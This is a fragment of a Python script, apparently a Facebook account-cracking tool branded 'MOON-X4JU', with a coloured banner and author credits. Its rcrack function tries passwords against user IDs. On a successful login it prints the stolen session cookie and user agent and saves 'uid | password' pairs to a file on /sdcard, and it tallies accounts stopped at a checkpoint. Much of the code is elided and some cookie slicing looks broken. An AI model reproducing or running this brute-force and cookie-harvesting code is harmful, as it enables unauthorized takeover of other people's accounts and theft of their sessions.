...
\033[1;32m══════════════════════════════════════════════════════
\033[1;32m[👬]  \033[1;32mCREATED BY\33    :  \033[1;33mMOON-X4JU\33[0;m\033[1;32m
\033[1;32m[👬]  \033[1;32mVAIRA        : \033[1;34m SAHRIYA 
\033[1;32m[👬]  \033[1;32mFACEBOOK     :  \033[1;35mX4JU.69
\033[1;32m[👬]  \033[1;32mTOOL VIRSION :  \033[1;36m1.1
...
def o():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/X4JU.69')
    print(xxx)
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:66]
                print('    \033[1;32m(MOON-X4JU-OK😍”¥)  ' +uid+ ' | ' +ps+    '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/MOON-X4JU-OK😍.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:56]
                print('    \33[1;31m(MOON-X4JU-CP•)  ' +uid+ ' | ' +ps+           '  \33[1;33m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s[MOON-X4JU] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
